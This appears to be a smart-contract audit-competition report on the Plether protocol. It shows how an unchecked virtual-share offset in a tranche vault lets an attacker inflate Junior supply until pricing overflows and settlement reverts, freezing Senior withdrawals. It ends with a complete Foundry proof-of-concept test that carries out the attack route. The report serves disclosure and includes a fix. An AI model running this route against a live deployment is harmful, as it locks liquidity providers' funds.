# \#99410 [SC-Critical] Unchecked virtual-share headroom lets an attacker poison Junior supply and block Senior LP withdrawals

**Submitted on Nov 13th 2026 at 14:39:33 UTC by @n0fr33w1f14u for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99410
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Severity

**Medium** — Griefing (no profit motive for the attacker, but damage to users and the protocol). The settlement revert also makes Senior funds unwithdrawable through the normal path, which is at least "Temporary freezing of funds for at least 1 hour" (Medium).

Per contest rules impact is assessed first and feasibility affects only the payout. The feasibility limits are set out in full below.
```text
Feasibility Limitations

A report may be valid, cite an in-scope asset, and demonstrate an in-scope impact, while still facing real-world obstacles to executing the attack. Feasibility limitations define what may and may not be cited when evaluating those obstacles.

Impact is calculated first, separately from feasibility. Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it. A finding with a large impact that is infeasible retains that impact and severity, but is rewarded at a reduced amount.
```
## Summary

`TrancheVault` prices shares with a 1,000-share virtual offset (`VIRTUAL_SHARES = 1000`), and all Junior pricing evaluates `supply + 1000` with checked arithmetic. Deposit finalization never checks that the post-mint supply leaves room for that offset. It only relies on ERC-20 minting, which checks that the raw supply fits in `uint256`.

An attacker can drive raw Junior supply to exactly `2^256 - 1000`. Supply this large needs repeated deposits while Junior NAV is a small positive value. Every later pricing of a matured Junior redemption head then overflows. The attacker places one such redemption in the queue before the final mint. After maturity it cannot be cancelled by anyone, so every `settleLpEpoch()` call that reaches the Junior phase reverts. That rolls back all Senior redemption funding performed earlier in the same transaction.

Senior LPs are the victims. Their redemptions are funded only through `settleLpEpoch()`, and that call now reverts whenever the Senior phase finishes without a backlog, which is the normal case. No owner function can burn the poisoned supply, cancel the head, or replace the immutable redemption-math sidecar.

## Root cause

`packages/perps/src/TrancheVault.sol:1468-1474`, in `finalizeDepositEpochFromPool()`:

```solidity
epoch.finalized = true;
epoch.shares = shares;
...
_mint(address(this), shares);   // no check: totalSupply() + VIRTUAL_SHARES <= type(uint256).max
```

The deposit quote (`TrancheVault.sol:1398-1410`) evaluates the pre-mint supply, so it does not overflow:

```solidity
shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

With `A` = Junior NAV, `S` = raw supply, `d` = deposit and zero fee, this gives `minted = floor(d·(S+1000)/(A+1))`. When `A` is a few raw units and `d ≥ 1 USDG`, a single deposit multiplies effective supply by about 2^20. The zero-NAV guard in `HousePool._settleLpEpoch()` (`HousePool.sol:917`) defers activation only at exactly `A == 0`. It does not cover a small positive NAV.

The overflow sink is the Junior redemption pricing at `HousePool.sol:957`, which runs before the zero-payout refund branch and before the budget check:

```solidity
uint256 fullHeadAssets = REDEMPTION_MATH_SIDECAR.netAssetsForShares(
    remainingShares, phase.pricingPrincipal, phase.pricingSupply, 1, 1000, feeBps
);
```

That call reaches `HousePoolRedemptionMathLib.sol:46`:

```solidity
Math.mulDiv(shares, principal + virtualAssets, supply + virtualShares, Math.Rounding.Floor); // supply + 1000 overflows
```

The pricing runs even when Junior principal is 0, so the revert does not go away as NAV changes.

## Why the poison is persistent

| Escape route | Status |
| --- | --- |
| Controller cancels the redemption | Blocked once `currentLpEpoch() >= requestId` (`TrancheVault.sol:894`) |
| Refund branch for zero-value heads | Never reached, because the overflow happens first (`HousePool.sol:957` runs before line 960) |
| Burn shares through redemption funding | Needs the same pricing, so it reverts |
| Owner pause | `paused()` skips only the deposit phases; the redemption phases still run (`HousePool.sol:903`) |
| Replace the redemption math | `REDEMPTION_MATH_SIDECAR` is `immutable` (`HousePool.sol:137`) |
| New redemption requests | `estimateRedeemAssets()` overflows the same way, so these revert too |

## Impact

- **Senior LP withdrawals are blocked.** The Senior phase funds redemptions, then the Junior phase reverts, and the Senior payout, share burn and principal update are all rolled back. The PoC asserts each rollback.
- **All deposit activation is blocked.** The deposit phases run after the reverting Junior phase.
- **The attacker needs no privileges.** The route uses release parameters only (8% coupon, Junior maintenance fee at 0, 1 USDG seeds, Senior cap 40M at 80%) and permissionless calls only.

## Feasibility limitations

The constructed route has real limits:

- **It is slow and needs a quiet pool.** It takes about 5.4 years of coupon accrual, with Junior NAV landing on exact small values (1–7 raw units) at about 12 activations. It assumes no open positions, no third-party LP activity and no off-schedule settlement. Trading revenue or another settlement can invalidate the planned trajectory.
- **The attacker pays for it.** Attacker deposits total 95.36 USDG, and coupon accrual transfers them to Senior.
- **Senior LPs have a workaround.** A Senior backlog can bypass the Junior phase: when 16 or more matured Senior epochs leave a backlog, the `seniorWorkCapHit` early return (`HousePool.sol:869`) commits Senior funding. This lets coordinated Senior LPs withdraw by splitting requests across many epochs. The normal path still reverts.
- **Dust burns are not available.** Allocation-dust burns in `_consumeDepositEntitlement()` could restore headroom, but the route leaves no dust.

## Recommendation

Enforce the headroom invariant when minting. Apply it at the shared mint path, which also covers maintenance-fee shares:

```solidity
if (totalSupply() + shares > type(uint256).max - VIRTUAL_SHARES) revert TrancheVault__SupplyHeadroom();
```

Alternatively, reject deposit quotes whose resulting effective supply exceeds a sane bound, for example `2^200`.

## Proof of Concept

File: `test/poc/JuniorShareSupplyOverflow.t.sol`. It uses the production `HousePool` and `TrancheVault`, with `vm.warp` modelling the elapsed time.

```bash
forge test --match-path test/poc/JuniorShareSupplyOverflow.t.sol -vv
```

Result at `a82d4fef`:

```
[PASS] test_RealPoolSettlementRevertsAndRollsBackSeniorFunding() (gas: 11899876)
```

Steps:

1. Seed both tranches with 1 USDG each. The attacker deposits 49 USDG to Junior. An independent LP deposits 189 USDG to Senior.
2. Coupon accrual drains Junior to 60,530 raw units. A 1.270548 USDG deposit then aligns effective supply to exactly `2^40`.
3. The test runs ten more deposits, each at a computed small positive NAV, and each multiplies effective supply by `2^19` or `2^20`. Every planned amount is cross-checked against `quoteDepositFromState()`. Each activation time is checked to fall outside the oracle-frozen window.
4. A separate attacker account queues a one-share Junior redemption that matures after the final deposit.
5. The final deposit (2.097150 USDG at NAV = 1) brings raw supply to `type(uint256).max - 999`. The mint succeeds.
6. At the redemption epoch, the Senior LP's matured full redemption is processed first. `settleLpEpoch()` then reverts with `Panic(0x11)`. The test asserts that Senior principal, Senior supply, the vault's USDG balance and `accountedAssets` are all unchanged, and that the Senior request is still queued and unfunded.


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../packages/perps/test/perps/BasePerpTest.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice End-to-end reproduction of the Junior virtual-share headroom overflow.
/// @dev Uses the production HousePool and TrancheVault contracts. The sequence models the report's restrictive
///      no-trader, no-intervening-settlement route and uses vm.warp to model its multi-year passage of time.
contract JuniorShareSupplyOverflowTest is BasePerpTest {

    uint256 internal constant VIRTUAL_SHARES = 1000;
    uint256 internal constant COUPON_DENOMINATOR = 10_000 * 365 days;
    uint256 internal constant MIN_NAV_CANDIDATE = 1;
    uint256 internal constant MAX_NAV_CANDIDATE = 100;
    uint256 internal constant SENIOR_CAP = 40_000_000e6;

    address internal constant ATTACKER = address(0xA771);
    address internal constant SENIOR_LP = address(0x5E1102);
    address internal constant JUNIOR_REDEEMER = address(0xA772);

    struct RouteState {
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 effectiveSupply;
        uint256 timestamp;
    }

    struct PlannedDeposit {
        uint256 assets;
        uint256 nav;
        uint256 activationTime;
        uint256 expectedSeniorPrincipal;
        uint256 expectedJuniorPrincipal;
        uint256 expectedRawSupply;
    }

    function setUp() public override {
        super.setUp();

        // Use the release Senior admission limits for this path. BasePerpTest relaxes these limits for unrelated tests.
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = SENIOR_CAP;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        vm.warp(SETUP_TIMESTAMP);
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function test_RealPoolSettlementRevertsAndRollsBackSeniorFunding() public {
        // BasePerpTest creates one-USDG seed positions. Fund the first ordinary Junior deposit through the vault's
        // request -> pool settlement -> claim flow; this emits the corresponding request, epoch-finalized, and claim events.
        _fundJunior(ATTACKER, 49e6);

        // Queue a real Senior deposit. Settling 40 minutes after its epoch starts adds a controlled coupon interval
        // while keeping the deposit in its already-matured epoch.
        uint256 seniorDepositRequest = _requestDeposit(seniorVault, SENIOR_LP, 189e6);
        uint256 seniorDepositEpochStart = seniorVault.depositEpochStart(seniorDepositRequest);
        vm.warp(seniorDepositEpochStart + 2400);
        pool.settleLpEpoch(0, 0);
        _claimDeposit(seniorVault, seniorDepositRequest, SENIOR_LP);

        assertEq(pool.seniorPrincipal(), 190_000_024, "seed and Senior deposit state");
        assertEq(pool.juniorPrincipal(), 49_999_976, "seed and Junior deposit state");
        assertEq(juniorVault.totalSupply(), 50_000_441_003, "actual Junior share supply before alignment");

        // Queue a deposit that aligns effective Junior supply to 2^40. The selected time makes the real pool coupon
        // reduce Junior principal to 60,530 raw units before the pool prices and finalizes this deposit.
        uint256 alignmentRequest = _requestDeposit(juniorVault, ATTACKER, 1_270_548);
        uint256 alignmentCoupon = pool.juniorPrincipal() - 60_530;
        uint256 alignmentTime =
            pool.lastSeniorCouponCheckpointTime() + _elapsedForExactCoupon(pool.seniorPrincipal(), alignmentCoupon);
        assertFalse(_oracleFrozenAt(alignmentTime, block.timestamp), "alignment must occur outside a frozen window");
        vm.warp(alignmentTime);
        // HousePool reconciles the coupon, finalizes the matured deposit, and emits LpEpochSettled. The vault emits
        // DepositEpochFinalized; claiming below emits DepositSharesClaimed and AsyncDepositSharesClaimed.
        pool.settleLpEpoch(0, 0);
        _claimDeposit(juniorVault, alignmentRequest, ATTACKER);

        uint256 supplyAtAlignment = juniorVault.totalSupply();
        assertEq(supplyAtAlignment + VIRTUAL_SHARES, uint256(1) << 40, "effective supply after alignment");
        assertEq(pool.juniorPrincipal(), 1_331_078, "Junior principal after alignment");
        assertEq(pool.seniorPrincipal(), 239_939_470, "Senior principal after alignment");

        // Plan coupon checkpoints and deposits against actual production quote math. Each planned amount multiplies
        // effective supply by 2^n while leaving positive Junior NAV. Candidate times must be outside frozen windows.
        // The final step is chosen so raw supply reaches max - 999 while still fitting in uint256.
        uint256[11] memory exponents = [uint256(20), 19, 19, 20, 20, 19, 20, 20, 19, 20, 20];
        PlannedDeposit[11] memory route;
        uint256 routeStartTime = pool.lastSeniorCouponCheckpointTime();
        RouteState memory initialState = RouteState({
            seniorPrincipal: pool.seniorPrincipal(),
            juniorPrincipal: pool.juniorPrincipal(),
            effectiveSupply: juniorVault.accruedTotalSupply() + VIRTUAL_SHARES,
            timestamp: routeStartTime
        });
        bool routeFound = _findRoute(0, exponents, initialState, route);
        // Route planning temporarily warps time to inspect market windows. Restore the last real settlement time
        // before submitting any deposits; the planner itself performs no protocol state changes.
        vm.warp(routeStartTime);
        assertTrue(routeFound, "find a route outside frozen-market windows");

        for (uint256 i; i < 10; ++i) {
            // Each request escrows assets and emits DepositRequest/DepositRequested. The later pool settlement
            // determines shares from the coupon-adjusted NAV and emits the deposit and epoch settlement events.
            uint256 requestId = _requestDeposit(juniorVault, ATTACKER, route[i].assets);
            vm.warp(route[i].activationTime);
            pool.settleLpEpoch(0, 0);

            // Transfer an old share after its cooldown has expired, giving a separate account a redemption head.
            // This is a normal ERC20 transfer and does not change total supply.
            if (i == 1) {
                vm.prank(ATTACKER);
                assertTrue(juniorVault.transfer(JUNIOR_REDEEMER, 1), "transfer one unlocked share");
            }

            _claimDeposit(juniorVault, requestId, ATTACKER);
            assertEq(pool.seniorPrincipal(), route[i].expectedSeniorPrincipal, "Senior coupon checkpoint");
            assertEq(pool.juniorPrincipal(), route[i].expectedJuniorPrincipal, "Junior deposit principal");
            assertEq(juniorVault.totalSupply(), route[i].expectedRawSupply, "actual Junior raw share supply");
        }

        assertEq(juniorVault.totalSupply() + VIRTUAL_SHARES, uint256(1) << 236, "effective supply before final deposit");

        // Queue the final deposit before the triggering redemption. Its epoch will be mature at the planned
        // activation, but it is not settled yet. The vault emits DepositRequest and DepositRequested here.
        uint256 finalDepositRequest = _requestDeposit(juniorVault, ATTACKER, route[10].assets);
        uint256 finalHour = (route[10].activationTime / 1 hours) * 1 hours;
        uint256 redemptionRequestTime = finalHour - 299;
        assertGt(redemptionRequestTime, block.timestamp, "redemption request precedes final activation");
        vm.warp(redemptionRequestTime);

        // Both normal requestRedeem calls emit RedeemRequest and queue for the epoch after the final deposit's hour.
        // The Junior request is one share; the full-balance exception allows it despite its tiny estimated value.
        vm.prank(JUNIOR_REDEEMER);
        uint256 juniorRedeemEpoch = juniorVault.requestRedeem(1, JUNIOR_REDEEMER, JUNIOR_REDEEMER);
        uint256 seniorShares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 seniorRedeemEpoch = seniorVault.requestRedeem(seniorShares, SENIOR_LP, SENIOR_LP);
        assertEq(juniorRedeemEpoch, finalHour / 1 hours + 1, "Junior redemption matures after final deposit");
        assertEq(seniorRedeemEpoch, juniorRedeemEpoch, "both redemptions share the next epoch");

        vm.warp(route[10].activationTime);
        // This settlement sees no matured redemption yet, so it can mint the final deposit and emit
        // DepositEpochFinalized/LpEpochSettled before raw supply reaches max - 999.
        pool.settleLpEpoch(0, 0);
        _claimDeposit(juniorVault, finalDepositRequest, ATTACKER);

        assertEq(pool.seniorPrincipal(), route[10].expectedSeniorPrincipal, "final Senior coupon checkpoint");
        assertEq(pool.juniorPrincipal(), route[10].expectedJuniorPrincipal, "final Junior principal");
        assertEq(juniorVault.totalSupply(), type(uint256).max - 999, "raw supply still fits uint256");

        // At the redemption epoch, HousePool processes Senior first. That phase tentatively transfers Senior assets,
        // burns escrowed shares, and emits RedeemEpochFunded. Junior pricing then overflows at supply + 1,000; the
        // transaction revert also removes those tentative state changes and logs.
        uint256 seniorPrincipalBeforeFailure = pool.seniorPrincipal();
        uint256 seniorSupplyBeforeFailure = seniorVault.totalSupply();
        uint256 seniorVaultAssetsBeforeFailure = settlementToken.balanceOf(address(seniorVault));
        uint256 accountedAssetsBeforeFailure = pool.accountedAssets();
        vm.warp(finalHour + 1 hours);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);

        assertEq(pool.seniorPrincipal(), seniorPrincipalBeforeFailure, "Senior principal rolled back");
        assertEq(seniorVault.totalSupply(), seniorSupplyBeforeFailure, "Senior share burn rolled back");
        assertEq(
            settlementToken.balanceOf(address(seniorVault)),
            seniorVaultAssetsBeforeFailure,
            "Senior payout transfer rolled back"
        );
        assertEq(pool.accountedAssets(), accountedAssetsBeforeFailure, "pool accounting rolled back");
        assertEq(seniorVault.claimableRedeemAssets(seniorRedeemEpoch, SENIOR_LP), 0, "Senior request remains unfunded");
        assertEq(
            seniorVault.pendingRedeemRequest(seniorRedeemEpoch, SENIOR_LP),
            seniorShares,
            "Senior redemption remains queued"
        );
        assertEq(
            juniorVault.pendingRedeemRequest(juniorRedeemEpoch, JUNIOR_REDEEMER), 1, "Junior request remains queued"
        );
    }

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId) {
        // Act as the LP for mint, approval, and request so the production vault sees the real owner as msg.sender.
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        uint256 requestId,
        address lp
    ) internal returns (uint256 shares) {
        // Claim the entire finalized asset entitlement so no unclaimed deposit-share dust remains in the vault.
        uint256 assets = vault.claimableDepositRequest(requestId, lp);
        assertGt(assets, 0, "deposit epoch is claimable");
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, assets, lp, lp);
        assertGt(shares, 0, "deposit mints shares");
    }

    function _findRoute(
        uint256 index,
        uint256[11] memory exponents,
        RouteState memory state,
        PlannedDeposit[11] memory route
    ) internal returns (bool) {
        if (index == exponents.length) {
            return true;
        }

        uint256 exponent = exponents[index];
        uint256 supplyBefore = state.effectiveSupply - VIRTUAL_SHARES;
        for (uint256 nav = MIN_NAV_CANDIDATE; nav <= MAX_NAV_CANDIDATE; ++nav) {
            if (state.juniorPrincipal <= nav) {
                continue;
            }
            uint256 coupon = state.juniorPrincipal - nav;
            uint256 elapsed = _elapsedForExactCoupon(state.seniorPrincipal, coupon);
            if (elapsed < 1 hours) {
                continue;
            }
            uint256 activationTime = state.timestamp + elapsed;
            if (_oracleFrozenAt(activationTime, state.timestamp)) {
                continue;
            }

            uint256 assets = (nav + 1) * ((uint256(1) << exponent) - 1);
            if (assets < 1e6) {
                continue;
            }

            uint256 expectedRawSupply;
            if (index + 1 == exponents.length) {
                expectedRawSupply = type(uint256).max - 999;
            } else {
                uint256 effectiveSupplyAfter = state.effectiveSupply * (uint256(1) << exponent);
                expectedRawSupply = effectiveSupplyAfter - VIRTUAL_SHARES;
            }
            uint256 expectedShares = expectedRawSupply - supplyBefore;
            // Require the actual TrancheVault quote to produce the exact planned share delta; this prevents the
            // schedule from relying only on a hand-calculated supply transition.
            if (juniorVault.quoteDepositFromState(assets, nav, supplyBefore, 0) != expectedShares) {
                continue;
            }

            route[index] = PlannedDeposit({
                assets: assets,
                nav: nav,
                activationTime: activationTime,
                expectedSeniorPrincipal: state.seniorPrincipal + coupon,
                expectedJuniorPrincipal: nav + assets,
                expectedRawSupply: expectedRawSupply
            });

            if (index + 1 == exponents.length) {
                return true;
            }

            RouteState memory nextState = RouteState({
                seniorPrincipal: state.seniorPrincipal + coupon,
                juniorPrincipal: nav + assets,
                effectiveSupply: expectedRawSupply + VIRTUAL_SHARES,
                timestamp: activationTime
            });
            if (_findRoute(index + 1, exponents, nextState, route)) {
                return true;
            }
        }
        return false;
    }

    function _elapsedForExactCoupon(
        uint256 seniorPrincipal,
        uint256 coupon
    ) internal view returns (uint256 elapsed) {
        // The route's Senior principal grows slowly enough that every integer coupon amount is reachable at a
        // second-level timestamp. Return the first elapsed second whose production coupon rounds to the target.
        uint256 rateNumerator = seniorPrincipal * pool.seniorRateBps();
        assertLt(rateNumerator, COUPON_DENOMINATOR, "route requires less than one raw coupon unit per second");
        uint256 numerator = coupon * COUPON_DENOMINATOR;
        elapsed = (numerator + rateNumerator - 1) / rateNumerator;
        assertEq(rateNumerator * elapsed / COUPON_DENOMINATOR, coupon, "coupon amount is exactly reachable");
    }

    function _oracleFrozenAt(
        uint256 timestamp,
        uint256 restoreTimestamp
    ) internal returns (bool frozen) {
        // Use the engine's own market-calendar view for the candidate timestamp, then restore the planner's state time.
        vm.warp(timestamp);
        frozen = engine.isOracleFrozen();
        vm.warp(restoreTimestamp);
    }

}


```
